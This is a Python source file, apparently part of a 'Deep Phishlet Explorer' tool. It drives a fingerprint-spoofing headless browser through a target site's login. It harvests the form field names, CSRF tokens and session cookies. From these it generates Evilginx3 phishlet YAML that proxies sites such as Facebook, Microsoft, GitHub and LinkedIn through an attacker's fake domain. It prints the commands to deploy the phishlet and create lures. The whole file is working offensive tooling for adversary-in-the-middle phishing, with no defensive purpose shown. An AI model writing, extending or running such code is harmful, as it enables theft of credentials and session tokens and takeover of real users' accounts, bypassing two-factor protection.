            '[data-testid*="submit"]','[data-testid*="login"]',
        ]
        for sel in sels:
            try:
                btn = await page.query_selector(sel)
                if btn and await btn.is_visible():
                    await btn.click()
                    return True
            except Exception:
                continue
        try:
            await page.keyboard.press("Enter")
            return True
        except Exception:
            pass
        return False

    # ─────────────────────────────────────────
    #  Form extraction
    # ─────────────────────────────────────────

    async def _extract_forms(self, page: Page, page_url: str):
        await self._scan_ctx(page, page_url)
        for frame in page.frames:
            if not frame.url or not frame.url.startswith("http"): continue
            if frame.url == page_url: continue
            try: await self._scan_ctx(frame, frame.url)
            except Exception: pass

    async def _scan_ctx(self, ctx, page_url: str):
        found = False
        try:
            for form in await ctx.query_selector_all("form"):
                info = await self._parse_form(form, page_url)
                if info:
                    self.login_forms.append(info)
                    found = True
        except Exception:
            pass

        # always do loose scan to fill missing field names
        await self._loose_scan(ctx, page_url, already=found)

    async def _loose_scan(self, ctx, page_url: str, already: bool):
        uname = upass = ""
        for sel in PASSWORD_SELECTORS:
            try:
                el = await ctx.query_selector(sel)
                if el and await el.is_visible():
                    upass = await get_field_key(el) or "password"
                    break
            except Exception:
                continue
        if not upass: return

        for sel in EMAIL_SELECTORS:
            try:
                el = await ctx.query_selector(sel)
                if el and await el.is_visible():
                    uname = await get_field_key(el) or "email"
                    break
            except Exception:
                continue

        if already and self.login_forms:
            last = self.login_forms[-1]
            if not last.get("username_field") and uname: last["username_field"] = uname
            if not last.get("password_field") and upass: last["password_field"] = upass
        else:
            self.login_forms.append({
                "url": page_url, "action": "", "method": "POST",
                "username_field": uname, "password_field": upass,
                "csrf_field": "", "fields": [], "loose": True,
            })
            print(f"{Fore.GREEN}  [✓] Loose form: user='{uname}' pass='{upass}'{Style.RESET_ALL}")

    async def _parse_form(self, form, page_url: str) -> Optional[Dict]:
        action = await form.get_attribute("action") or ""
        method = (await form.get_attribute("method") or "POST").upper()
        inputs = await form.query_selector_all("input, select, textarea")
        uname = upass = csrf = ""
        fields = []
        for inp in inputs:
            try:
                itype    = (await inp.get_attribute("type")       or "text").lower()
                iname    = await inp.get_attribute("name")        or ""
                iid      = await inp.get_attribute("id")          or ""
                iph      = await inp.get_attribute("placeholder") or ""
                iac      = await inp.get_attribute("autocomplete")or ""
                combo    = (iname+iid+iph+iac).lower()
                fields.append({"name": iname, "id": iid, "type": itype})
                if itype == "password":
                    upass = iname or iid or "password"
                elif itype in ("text","email","tel"):
                    if any(x in combo for x in ["user","email","login","account",
                                                 "phone","mobile","username","identifier","text","log"]):
                        uname = iname or iid or "email"
                elif itype == "hidden":
                    if any(x in combo for x in ["csrf","xsrf","token","nonce"]):
                        csrf = iname or iid
                        self.js_token_names.add(csrf)
            except Exception:
                continue
        if not upass: return None
        if action and not action.startswith(("http://","https://")):
            action = urljoin(page_url, action)
        return {"url": page_url, "action": action, "method": method,
                "username_field": uname, "password_field": upass,
                "csrf_field": csrf, "fields": fields, "loose": False}

    # ─────────────────────────────────────────
    #  Cookies + storage + JS tokens
    # ─────────────────────────────────────────

    async def _collect_cookies(self, ctx: BrowserContext):
        for c in await ctx.cookies():
            domain = c.get("domain","").lstrip(".")
            name   = c.get("name","")
            if name and domain: self.cookie_map[domain].add(name)

    async def _collect_storage(self, page: Page):
        for expr in ["Object.keys(localStorage)","Object.keys(sessionStorage)"]:
            try: self.storage_keys.update(await page.evaluate(f"() => {expr}"))
            except Exception: pass

    async def _scrape_js_tokens(self, page: Page):
        try: html = await page.content()
        except Exception: return
        patterns = [
            r"""(?:getCookie|Cookies\.get|cookie\.get|readCookie)\s*\(\s*['"]([^'"]+)['"]""",
            r"""document\.cookie\s*[+=]+\s*['"]([^='"]+)=""",
            r"""<meta[^>]+name=['"]([^'"]*(?:csrf|token|xsrf)[^'"]*)['"]\s""",
        ]
        hints = ["token","sess","auth","csrf","xsrf","cookie","key","jwt","sid","uid","secret","bearer"]
        for pat in patterns:
            for m in re.finditer(pat, html, re.I): self.js_token_names.add(m.group(1))
        for m in re.finditer(r"""(?:var|let|const)\s+([A-Za-z_$][A-Za-z0-9_$]{2,49})\s*=""", html):
            nm = m.group(1)
            if any(h in nm.lower() for h in hints): self.js_token_names.add(nm)

    # ─────────────────────────────────────────
    #  Navigation helpers
    # ─────────────────────────────────────────

    async def _goto(self, page: Page, url: str) -> bool:
        for wait in ("domcontentloaded","commit"):
            try:
                await page.goto(url, wait_until=wait, timeout=90000)
                return True
            except Exception:
                pass
        print(f"{Fore.RED}  [!] Failed: {url}{Style.RESET_ALL}")
        return False

    async def _smart_wait(self, page: Page, ms: int = 3000):
        try: await page.wait_for_load_state("networkidle", timeout=30000)
        except Exception:
            try: await page.wait_for_load_state("domcontentloaded", timeout=30000)
            except Exception: pass
        await page.wait_for_timeout(ms)

    # ─────────────────────────────────────────
    #  Main explore
    # ─────────────────────────────────────────

    async def explore(self) -> Dict:
        self._target_reg = registrable(urlparse(self.target_url).netloc)
        mode = "REAL ACCOUNT" if self.has_account else "GUEST"
        print(f"\n{Fore.YELLOW}[+] {self._target_reg} | Mode: {mode}{Style.RESET_ALL}")

        async with async_playwright() as pw:
            browser = await pw.chromium.launch(
                headless=self.headless,
                args=[
                    "--start-maximized",
                    "--window-size=1920,1080",
                    "--disable-blink-features=AutomationControlled",
                    "--exclude-switches=enable-automation",
                    "--no-sandbox",
                    "--disable-dev-shm-usage",
                    "--lang=en-US",
                    "--no-first-run",
                    "--no-default-browser-check",
                    "--password-store=basic",
                ],
                ignore_default_args=["--enable-automation"],
            )

            ctx = await browser.new_context(
                viewport={"width": 1920, "height": 1080},
                locale="en-US",
                timezone_id="America/New_York",
                user_agent=(
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                    "AppleWebKit/537.36 (KHTML, like Gecko) "
                    "Chrome/124.0.0.0 Safari/537.36"
                ),
                extra_http_headers={"Accept-Language": "en-US,en;q=0.9"},
                ignore_https_errors=True,
                color_scheme="light",
                device_scale_factor=1,
                has_touch=False,
                java_script_enabled=True,
                bypass_csp=True,
                geolocation={"latitude": 40.7128, "longitude": -74.0060},
                permissions=["geolocation"],
            )

            page = await ctx.new_page()

            await page.add_init_script("""
                // Remove webdriver flag
                Object.defineProperty(navigator, 'webdriver', { get: () => undefined });

                // Realistic plugins
                Object.defineProperty(navigator, 'plugins', { get: () => [
                    { name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer' },
                    { name: 'Chrome PDF Viewer', filename: 'mhjfbmdgcfjbbpaeojofohoefgiehjai' },
                    { name: 'Native Client', filename: 'internal-nacl-plugin' },
                ]});

                Object.defineProperty(navigator, 'languages',         { get: () => ['en-US', 'en'] });
                Object.defineProperty(navigator, 'hardwareConcurrency',{ get: () => 8 });
                Object.defineProperty(navigator, 'deviceMemory',       { get: () => 8 });
                Object.defineProperty(screen,    'colorDepth',         { get: () => 24 });
                Object.defineProperty(navigator, 'vendor',             { get: () => 'Google Inc.' });
                Object.defineProperty(navigator, 'maxTouchPoints',     { get: () => 0 });
                Object.defineProperty(navigator, 'platform',           { get: () => 'Win32' });
                Object.defineProperty(navigator, 'appVersion',         { get: () =>
                    '5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
                });

                window.Notification = { permission: 'default' };

                window.chrome = {
                    runtime: {},
                    loadTimes: () => ({}),
                    csi: () => ({}),
                    app: {
                        isInstalled: false,
                        InstallState:  { DISABLED: 'disabled', INSTALLED: 'installed', NOT_INSTALLED: 'not_installed' },
                        RunningState:  { CANNOT_RUN: 'cannot_run', READY_TO_RUN: 'ready_to_run', RUNNING: 'running' }
                    }
                };

                // Fix permission query
                const origQuery = window.navigator.permissions.query;
                window.navigator.permissions.query = (p) =>
                    p.name === 'notifications'
                    ? Promise.resolve({ state: Notification.permission })
                    : origQuery(p);

                // Realistic screen dimensions
                Object.defineProperty(window, 'outerWidth',  { get: () => window.screen.width });
                Object.defineProperty(window, 'outerHeight', { get: () => window.screen.height });

                // Canvas fingerprint noise
                const _toDataURL  = HTMLCanvasElement.prototype.toDataURL;
                const _toBlob     = HTMLCanvasElement.prototype.toBlob;
                const _getImageData = CanvasRenderingContext2D.prototype.getImageData;
                const noise = () => Math.floor(Math.random() * 3) - 1;

                HTMLCanvasElement.prototype.toDataURL = function(...args) {
                    const ctx = this.getContext('2d');
                    if (ctx) {
                        const img = ctx.getImageData(0, 0, this.width, this.height);
                        for (let i = 0; i < img.data.length; i += 4) { img.data[i] += noise(); }
                        ctx.putImageData(img, 0, 0);
                    }
                    return _toDataURL.apply(this, args);
                };

                // WebGL fingerprint spoof
                const getParameter = WebGLRenderingContext.prototype.getParameter;
                WebGLRenderingContext.prototype.getParameter = function(parameter) {
                    if (parameter === 37445) return 'Intel Inc.';
                    if (parameter === 37446) return 'Intel Iris OpenGL Engine';
                    return getParameter.apply(this, arguments);
                };

                // AudioContext fingerprint spoof
                const origGetChannelData = AudioBuffer.prototype.getChannelData;
                AudioBuffer.prototype.getChannelData = function(...args) {
                    const data = origGetChannelData.apply(this, args);
                    for (let i = 0; i < data.length; i += 100) {
                        data[i] += Math.random() * 0.0001;
                    }
                    return data;
                };
            """)

            await page.route("**/*", self._intercept)

            print(f"\n{Fore.CYAN}━━ Phase 1: Navigation ━━{Style.RESET_ALL}")
            start = self.login_page_url if self.use_direct else self.target_url
            await self._goto(page, start)
            await self._smart_wait(page, 2000)
            await human_move(page)

            print(f"\n{Fore.CYAN}━━ Phase 2: Login Flow ━━{Style.RESET_ALL}")
            await self._wait_for_page_ready(page)
            await self._run_login_flow(page)

            print(f"\n{Fore.CYAN}━━ Phase 3: Form Extraction ━━{Style.RESET_ALL}")
            await page.wait_for_timeout(1500)
            await self._extract_forms(page, page.url)

            print(f"\n{Fore.CYAN}━━ Phase 4: Cookies & Storage ━━{Style.RESET_ALL}")
            await self._collect_cookies(ctx)
            await self._collect_storage(page)
            await self._scrape_js_tokens(page)

            print(f"\n{Fore.CYAN}━━ Phase 5: Cookie Collection ━━{Style.RESET_ALL}")
            if self._login_success:
                print(f"{Fore.YELLOW}  [*] Collecting cookies (max 60s)...{Style.RESET_ALL}")
                prev_total = 0
                stable_rounds = 0
                for i in range(6):
                    await page.wait_for_timeout(10000)
                    await self._collect_cookies(ctx)
                    total = sum(len(v) for v in self.cookie_map.values())
                    print(f"{Fore.CYAN}  [*] {(i+1)*10}s — cookies: {total}{Style.RESET_ALL}")
                    if total == prev_total:
                        stable_rounds += 1
                        if stable_rounds >= 2:
                            print(f"{Fore.GREEN}  [✓] Cookies stable at {total}{Style.RESET_ALL}")
                            break
                    else:
                        stable_rounds = 0
                    prev_total = total
            await self._crawl(page, ctx)
            await self._collect_cookies(ctx)

            await browser.close()

        if not self._login_success and self.has_account:
            post_login_signs = ["/messages/", "/feed", "/home", "/friends"]
            if any(any(s in u for s in post_login_signs)
                for u in [c.get("url", "") for c in []]):
                self._login_success = True
            total_cookies = sum(len(v) for v in self.cookie_map.values())
            if total_cookies > 10:
                self._login_success = True

        mode_str = "✅ Real login" if self._login_success else "👤 Guest mode"
        print(f"\n{Fore.GREEN}[✓] Done ({mode_str}).{Style.RESET_ALL}")
        return self._assemble()

    async def _crawl(self, page: Page, ctx: BrowserContext):
        current_url = page.url
        print(f"{Fore.CYAN}  [*] Post-login page: {current_url[:70]}{Style.RESET_ALL}")
        await self._collect_cookies(ctx)
        await self._scrape_js_tokens(page)
        print(f"{Fore.CYAN}  [✓] Cookies collected{Style.RESET_ALL}")

    # ─────────────────────────────────────────
    #  Assemble
    # ─────────────────────────────────────────

    def _assemble(self) -> Dict:
        return {
            "base_domain":    urlparse(self.target_url).netloc,
            "target_reg":     self._target_reg,
            "net_domains":    set(self.net_domains),
            "cookie_map":     dict(self.cookie_map),
            "storage_keys":   self.storage_keys,
            "js_tokens":      self.js_token_names,
            "login_forms":    self.login_forms,
            "force_post":     self.force_post_list,
            "auth_url_paths": self.auth_url_paths,
            "all_post_keys":  self.all_post_keys,
            "cred_user":      self._cred_user,
            "cred_pass":      self._cred_pass,
            "login_success":  self._login_success,
        }

    # ═══════════════════════════════════════════════════
    #  YAML builder
    # ═══════════════════════════════════════════════════

    def _build_js_inject(self, base_domain: str, login_path: str) -> List[Dict]:
        trigger_paths = [login_path, "/"]
        if login_path not in ["/", ""]:
            trigger_paths = list(set(trigger_paths))

        root_domain = registrable(base_domain)

        base_script = (
            "(function() {\n"
            "  'use strict';\n"
            "  try {\n"
            "    Object.defineProperty(document, 'domain', {\n"
            "      get: function() { return '" + "' + root_domain + '" + "'; },\n"
            "      configurable: true\n"
            "    });\n"
            "  } catch(e) {}\n"
            "})();"
        ).replace("' + root_domain + '", root_domain)

        inject = [{
            "trigger_domains": [base_domain],
            "trigger_paths":   trigger_paths,
            "trigger_params":  [],
            "script":          base_script.strip(),
        }]

        if "facebook.com" in base_domain:
            inject.append({
                "trigger_domains": [base_domain],
                "trigger_paths":   ["/checkpoint/", "/two_factor/", "/login/device-based/"],
                "trigger_params":  [],
                "script": """
(function() {
  try {
    Object.defineProperty(document, 'domain', {
      get: function() { return 'facebook.com'; },
      configurable: true
    });
  } catch(e) {}
})();
""".strip(),
            })

        return inject

    def build_yaml(self, r: Dict) -> Dict:
        base_domain = r["base_domain"]
        target_reg  = r.get("target_reg", registrable(base_domain))
        _, base_reg = split_fqdn(base_domain)

        proxy_hosts = []
        seen_fqdns:      Set[str]       = set()
        used_phish_subs: Dict[str, int] = {}

        def _phish_sub_for(fqdn: str, orig_sub: str) -> str:
            import hashlib
            if orig_sub == "":
                candidate = registrable(fqdn).split(".")[0]
            elif "." in orig_sub:
                candidate = "cdn-" + hashlib.md5(orig_sub.encode()).hexdigest()[:6]
            else:
                candidate = orig_sub

            candidate = candidate.replace(".", "-")

            if candidate not in used_phish_subs:
                used_phish_subs[candidate] = 1
                return candidate
            used_phish_subs[candidate] += 1
            return f"{candidate}{used_phish_subs[candidate]}"

        def add_host(fqdn: str, landing: bool):
            fqdn = fqdn.lower()
            if fqdn in seen_fqdns: return
            is_required = any(
                fqdn in required_list
                for required_list in SITE_REQUIRED_DOMAINS.values()
            )
            if not landing and not is_required and not needs_proxy(fqdn, target_reg):
                return
            seen_fqdns.add(fqdn)
            orig_sub, reg_domain = split_fqdn(fqdn)
            phish_sub = _phish_sub_for(fqdn, orig_sub)
            proxy_hosts.append({
                "phish_sub":   phish_sub,
                "orig_sub":    orig_sub,
                "domain":      reg_domain,
                "session":     needs_session(fqdn),
                "is_landing":  landing,
                "auto_filter": True,
            })

        add_host(base_domain, True)

        for site_key, required_list in SITE_REQUIRED_DOMAINS.items():
            if site_key in target_reg:
                for fqdn in required_list:
                    add_host(fqdn, False)
                break

        for fqdn in sorted(r["net_domains"]):
            add_host(fqdn, False)

        sub_filters = []
        for ph in proxy_hosts:
            real_fqdn = (f"{ph['orig_sub']}.{ph['domain']}"
                         if ph["orig_sub"] else ph["domain"])
            fake_fqdn = (f"{ph['phish_sub']}.{self.fake_domain}"
                         if ph["phish_sub"] else self.fake_domain)
            sub_filters.append({
                "triggers_on": real_fqdn,
                "orig_sub":    ph["orig_sub"],
                "domain":      ph["domain"],
                "search":      f"https://{real_fqdn}",
                "replace":     "https://{hostname}",
                "mimes": ["text/html","application/json","application/javascript"],
            })

        token_map: Dict[str, Set[str]] = defaultdict(set)
        for domain, names in r["cookie_map"].items():
            token_map[domain].update(names)

        for site, critical in KNOWN_AUTH_COOKIES.items():
            if site in target_reg:
                bare = registrable(base_domain)
                token_map[bare].update(critical)

        for k in (r["storage_keys"] | r["js_tokens"]):
            if k and len(k) > 1:
                token_map[base_domain].add(k)

        merged_token_map: Dict[str, Set[str]] = defaultdict(set)
        for domain, names in token_map.items():
            clean = registrable(domain.lstrip("."))
            merged_token_map[clean].update(names)
        token_map = merged_token_map

        ALLOWED_TOKEN_DOMAINS = {target_reg}
        if "facebook.com" in target_reg:
            ALLOWED_TOKEN_DOMAINS.update({"facebook.com", "www.facebook.com"})
        if "twitter.com" in target_reg or "x.com" in target_reg:
            ALLOWED_TOKEN_DOMAINS.update({"twitter.com", "x.com"})
        if "microsoftonline.com" in target_reg:
            ALLOWED_TOKEN_DOMAINS.update({"microsoftonline.com", "login.microsoftonline.com"})

        NOISE_COOKIE_NAMES = {
            "_GRECAPTCHA", "_ga", "_gid", "_gat", "__utm",
            "NID", "1P_JAR", "CONSENT", "SOCS",
            "AEC", "DV", "OTZ", "SEARCH_SAMESITE",
        }
        NOISE_COOKIE_PREFIXES = ("_ga", "_gid", "_gat", "__utm", "GTM")
        NOISE_COOKIE_PATTERNS = (
            "banzai:last_storage_flush", "falco_queue", "hb_timestamp",
            "signal_flush", "last_headload", "screen_time",
            "mw_encrypted", "TabId", "Session^$^$",
        )

        auth_tokens = []
        for domain in sorted(token_map):
            domain_clean = domain.lstrip(".")
            is_related = (
                domain_clean == target_reg or
                domain_clean.endswith("." + target_reg) or
                any(d in domain_clean for d in ALLOWED_TOKEN_DOMAINS)
            )
            if not is_related:
                continue

            keys_raw = token_map[domain]
            keys = sorted(
                k for k in keys_raw
                if k and len(k) > 1
                and k not in NOISE_COOKIE_NAMES
                and not any(k.startswith(p) for p in NOISE_COOKIE_PREFIXES)
                and not any(pat in k for pat in NOISE_COOKIE_PATTERNS)
                and "^$^$" not in k
                and len(k) <= 60
            )
            if not keys:
                continue
            keys.append(".*,regexp")
            dot = f".{domain}" if not domain.startswith(".") else domain
            auth_tokens.append({"domain": dot, "keys": keys})

        if not auth_tokens:
            auth_tokens.append({"domain": f".{base_reg}", "keys": [".*,regexp"]})

        uname = r["cred_user"]
        upass = r["cred_pass"]

        if not is_valid_field_name(uname): uname = ""
        if not is_valid_field_name(upass): upass = ""

        if not uname or not upass:
            for form in r["login_forms"]:
                fn = form.get("username_field","")
                fp = form.get("password_field","")
                if not uname and fn and is_valid_field_name(fn): uname = fn
                if not upass and fp and is_valid_field_name(fp): upass = fp
                if uname and upass: break

        for k in r["all_post_keys"]:
            if not is_valid_field_name(k): continue
            kl = k.lower()
            if not upass and any(x in kl for x in PASS_HINTS): upass = k
            if not uname and any(x in kl for x in USER_HINTS):  uname = k

        if not uname or not upass:
            for site, (ku, kp) in KNOWN_CREDENTIALS.items():
                if site in target_reg:
                    if not uname: uname = ku
                    if not upass: upass = kp
                    print(f"{Fore.YELLOW}  [!] Known creds ({site}): {ku}/{kp}{Style.RESET_ALL}")
                    break

        if uname == "__user":
            for form in r["login_forms"]:
                if form.get("username_field") and form["username_field"] != "__user":
                    uname = form["username_field"]
                    break
            else:
                uname = "email"

        if not uname: uname = "email"
        if not upass: upass = "password"

        credentials = {
            "username": {"key": uname, "search": "(.*)", "type": "post"},
            "password": {"key": upass, "search": "(.*)", "type": "post"},
        }

        KNOWN_LOGIN_PATHS = {
            "linkedin.com":        ("www.linkedin.com",           "/login/"),
            "facebook.com":        ("www.facebook.com",           "/login/"),
            "x.com":               ("x.com",                      "/i/flow/login"),
            "twitter.com":         ("twitter.com",                "/i/flow/login"),
            "instagram.com":       ("www.instagram.com",          "/accounts/login/"),
            "spotify.com":         ("accounts.spotify.com",       "/en/login"),
            "microsoftonline.com": ("login.microsoftonline.com",  "/"),
            "github.com":          ("github.com",                 "/login"),
            "reddit.com":          ("www.reddit.com",             "/login/"),
            "discord.com":         ("discord.com",                "/login"),
            "tiktok.com":          ("www.tiktok.com",             "/login/"),
        }

        if self.use_direct and self.login_page_url:
            lp           = urlparse(self.login_page_url)
            login_domain = lp.netloc
            login_path   = lp.path or "/"
        else:
            login_domain = base_domain
            login_path   = "/"
            for site, (kd, kp) in KNOWN_LOGIN_PATHS.items():
                if site in target_reg:
                    login_domain = kd
                    login_path   = kp
                    break


        INVALID_AUTH_PATTERNS = [
            "/messages/t/",    
            "/messages/e2ee/",  
            "/accounts/xuserid/",
            "/notifications/client/",
            "/recaptcha/",          
            "/user_preferences/",   
            "/userverify",          
            "/enterprise/",
        ]

        cleaned_auth = set()
        STATIC_EXTENSIONS = (".js", ".css", ".png", ".jpg", ".jpeg",
                             ".gif", ".svg", ".woff", ".woff2", ".ttf",
                             ".ico", ".map", ".json", ".xml", ".txt")

        for path in r["auth_url_paths"]:
            if any(pat in path for pat in INVALID_AUTH_PATTERNS):
                continue
            path_lower = path.lower()
            if any(path_lower.endswith(ext) for ext in STATIC_EXTENSIONS):
                continue
            if any(seg in path_lower for seg in ["/assets/", "/static/", "/public/",
                                                  "/_next/", "/__/", "/vendor/"]):
                continue
            api_patterns = [
                "/api/ingraphs/", "/api/metadata/", "/litms/api/",
                "/api/v", "/rest/api/", "/_api/", "/__api/",
                "/homepage-guest/api/",
            ]
            if any(pat in path_lower for pat in api_patterns):
                continue
            if len(path) > 40:
                continue
            import re as _re
            if _re.search(r'/[0-9]{8,}', path):
                continue
            cleaned_auth.add(path)

        for site, paths in KNOWN_AUTH_PATHS.items():
            if site in target_reg:
                cleaned_auth.update(paths)

        auth_urls = sorted(cleaned_auth)[:6] or ["/"]

        KNOWN_STATIC_FORCE_VALUES = {
            "remember_me": "1",
            "rememberme": "1",
            "keep_me_signed_in": "1",
            "stay_signed_in": "1",
            "loginoptions": "1",
            "remembermfa": "true",
            "__ccg": "GOOD",
            "__ccg": "EXCELLENT",
        }
        DYNAMIC_FORCE_FIELD_NAMES = {
            "__hsdp", "__hsdp2", "fb_dtsg", "jazoest", "lsd",
            "csrftoken", "csrf_token", "xsrf_token", "_token",
            "authenticity_token", "csrfmiddlewaretoken",
            "__requestverificationtoken",
            "callbackurl", "callback_url", "redirect_uri",
            "state", "nonce", "code_verifier",
        }

        merged_fp: Dict[str, Dict] = {} 

        for fp in r["force_post"]:
            if not fp.get("search"):
                continue
            path = fp["path"]
            if path == "/" and not any(s["key"] for s in fp.get("search",[])):
                continue

            clean_force = []
            for f_item in fp.get("force", []):
                key_lower = f_item["key"].lower()
                value = f_item.get("value", "")
                if key_lower in DYNAMIC_FORCE_FIELD_NAMES:
                    continue
                if len(value) > 20:
                    continue
                clean_force.append(f_item)

            if path not in merged_fp:
                merged_fp[path] = {
                    "path":   path,
                    "search": list(fp["search"]),
                    "force":  clean_force,
                    "type":   fp["type"],
                }
            else:
                existing_keys = {s["key"] for s in merged_fp[path]["search"]}
                for s_item in fp["search"]:
                    if s_item["key"] not in existing_keys:
                        merged_fp[path]["search"].append(s_item)
                        existing_keys.add(s_item["key"])
                # دمج force items
                existing_force_keys = {f["key"] for f in merged_fp[path]["force"]}
                for f_item in clean_force:
                    if f_item["key"] not in existing_force_keys:
                        merged_fp[path]["force"].append(f_item)

        force_post = []
        for path, entry in merged_fp.items():
            clean_entry = {
                "path":   entry["path"],
                "search": entry["search"],
                "type":   entry["type"],
            }
            if entry.get("force"):
                clean_entry["force"] = entry["force"]
            force_post.append(clean_entry)

        for path, entry in merged_fp.items():
            search = entry["search"]
            cred_keys = {self._cred_user, self._cred_pass}
            priority = [s for s in search if s["key"] in cred_keys]
            others   = [s for s in search if s["key"] not in cred_keys]
            entry["search"] = (priority + others)[:15]

        if not force_post:
            seen_paths: Set[str] = set()
            for form in r["login_forms"]:
                path = urlparse(form.get("action","")).path or "/"
                if path in seen_paths: continue
                seen_paths.add(path)
                items = []
                if form.get("username_field") and is_valid_field_name(form["username_field"]):
                    items.append({"key": form["username_field"], "search": "(.*)"})
                if form.get("password_field") and is_valid_field_name(form["password_field"]):
                    items.append({"key": form["password_field"], "search": "(.*)"})
                if items:
                    force_post.append({"path": path, "search": items, "type": "post"})

        js_inject = self._build_js_inject(base_domain, login_path)

        result = {
            "name":        self.phishlet_name,
            "author":      "Momen Abu Assi - v1.0.0",
            "min_ver":     "3.0.0",
            "proxy_hosts": proxy_hosts,
            "sub_filters": sub_filters,
            "auth_tokens": auth_tokens,
            "credentials": credentials,
            "auth_urls":   auth_urls,
            "login":       {"domain": login_domain, "path": login_path},
            "force_post":  force_post,
        }
        if js_inject:
            result["js_inject"] = js_inject
        return result

    # ═══════════════════════════════════════════════════
    #  YAML serializer  ← v1.0.0: renders force block
    # ═══════════════════════════════════════════════════

    def _inline_dict(self, d: Dict) -> str:
        parts = []
        for k, v in d.items():
            if isinstance(v, bool):   parts.append(f"{k}: {'true' if v else 'false'}")
            elif isinstance(v, list): parts.append(f"{k}: [{', '.join(repr(x) if isinstance(x,str) else str(x) for x in v)}]")
            elif isinstance(v, str):  parts.append(f"{k}: '{v}'")
            else:                     parts.append(f"{k}: {v}")
        return "{" + ", ".join(parts) + "}"

    def save_yaml(self, data: Dict) -> str:
        base_dir = os.path.dirname(os.path.abspath(__file__))
        output_dir = os.path.join(base_dir, "phishlets")
        os.makedirs(output_dir, exist_ok=True)
        path = os.path.join(output_dir, f"{self.phishlet_name}.yaml")
        lines = []

        for key, val in data.items():
            if key == "proxy_hosts":
                lines.append("proxy_hosts:")
                for h in val:
                    lines.append("  - " + self._inline_dict(h))

            elif key == "sub_filters":
                if val:
                    lines.append("sub_filters:")
                    for sf in val:
                        lines.append("  - " + self._inline_dict(sf))
                else:
                    lines.append("sub_filters: []")

            elif key == "auth_tokens":
                lines.append("auth_tokens:")
                for at in val:
                    lines.append(f"  - domain: '{at['domain']}'")
                    lines.append(f"    keys: {json.dumps(at['keys'])}")

            elif key == "auth_urls":
                lines.append("auth_urls:")
                for u in val: lines.append(f"  - '{u}'")

            elif key == "credentials":
                lines.append("credentials:")
                for ck, cv in val.items():
                    lines.append(f"  {ck}:")
                    for vk, vv in cv.items():
                        lines.append(f"    {vk}: '{vv}'")

            elif key == "login":
                lines.append("login:")
                lines.append(f"  domain: '{val['domain']}'")
                lines.append(f"  path: '{val['path']}'")

            elif key == "js_inject":
                if val:
                    lines.append("js_inject:")
                    for ji in val:
                        domains_str = ", ".join(f"'{d}'" for d in ji.get("trigger_domains",[]))
                        paths_str   = ", ".join(f"'{p}'" for p in ji.get("trigger_paths",[]))
                        lines.append(f"  - trigger_domains: [{domains_str}]")
                        lines.append(f"    trigger_paths:   [{paths_str}]")
                        lines.append(f"    trigger_params:  []")
                        script = ji.get("script","").strip()
                        lines.append("    script: |")
                        for script_line in script.split("\n"):
                            lines.append(f"      {script_line}")

            elif key == "force_post":
                if val:
                    lines.append("force_post:")
                    for fp in val:
                        lines.append(f"  - path: '{fp['path']}'")

                        if fp.get("search"):
                            lines.append("    search:")
                            for s in fp["search"]:
                                safe_key = s["key"].replace("[", r"\[").replace("]", r"\]")
                                lines.append(f"      - {{key: '{safe_key}', search: '{s['search']}'}}")

                        force_list = fp.get("force") or [{"key": "remember_me", "value": "1"}]
                        lines.append("    force:")
                        for f in force_list:
                            lines.append(f"      - {{key: '{f['key']}', value: '{f['value']}'}}")

                        lines.append(f"    type: '{fp['type']}'")
                else:
                    lines.append("force_post: []")

            elif isinstance(val, str):
                lines.append(f"{key}: '{val}'")
            else:
                lines.append(f"{key}: {val}")

        with open(path, "w", encoding="utf-8") as f:
            f.write("\n".join(lines) + "\n")
        return path

    # ─────────────────────────────────────────
    #  Run
    # ─────────────────────────────────────────

    async def run(self):
        try:
            self.get_input()
            result = await self.explore()
            print(f"\n{Fore.YELLOW}[+] Building YAML...{Style.RESET_ALL}")
            data   = self.build_yaml(result)
            path   = self.save_yaml(data)

            tok_count  = sum(len(a["keys"]) for a in data["auth_tokens"])
            login_mode = "✅ Real login" if result.get("login_success") else "👤 Guest mode"

            print(f"""
{Fore.GREEN}{'═'*64}
  ✓  PHISHLET SAVED: {path}
{'═'*64}{Style.RESET_ALL}
{Fore.CYAN}  Mode          : {login_mode}
  Proxy hosts   : {len(data['proxy_hosts'])}
  Auth tokens   : {tok_count}
  Login forms   : {len(result['login_forms'])}
  Force POST    : {len(data['force_post'])} entries
  Auth URLs     : {len(data['auth_urls'])}
  Credentials   : user={data['credentials']['username']['key']}  pass={data['credentials']['password']['key']}
  Login         : {data['login']['domain']}{data['login']['path']}{Style.RESET_ALL}

{Fore.YELLOW}Evilginx3 commands:{Style.RESET_ALL}
  {Fore.GREEN}phishlets load {self.phishlet_name}
  phishlets hostname {self.phishlet_name} {self.fake_domain}
  phishlets enable {self.phishlet_name}
  lures create {self.phishlet_name}{Style.RESET_ALL}
""")
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Stopped.{Style.RESET_ALL}")
        except Exception as e:
            import traceback
            print(f"{Fore.RED}[!] {e}{Style.RESET_ALL}")
            traceback.print_exc()


# ═══════════════════════════════════════════════════
#  CLI
# ═══════════════════════════════════════════════════

def main():
    ap = argparse.ArgumentParser(description="Deep Phishlet Explorer v1.0.0")
    ap.add_argument("--url",       "-u")
    ap.add_argument("--domain",    "-d")
    ap.add_argument("--name",      "-n")
    ap.add_argument("--login-url", "-l")
    ap.add_argument("--email",     "-e")
    ap.add_argument("--password",  "-p")
    ap.add_argument("--headless",  action="store_true")
    args = ap.parse_args()

    ex = PhishletExplorer()
    if args.url and args.domain:
        ex.target_url    = args.url if args.url.startswith("http") else "https://"+args.url
        ex.fake_domain   = args.domain
        ex.phishlet_name = args.name or urlparse(ex.target_url).netloc.split(".")[-2]
        ex.headless      = args.headless
        if args.login_url:
            ex.use_direct     = True
            ex.login_page_url = args.login_url
        if args.email and args.password:
            ex.has_account   = True
            ex.account_email = args.email
            ex.account_pass  = args.password

    asyncio.run(ex.run())


if __name__ == "__main__":
    main()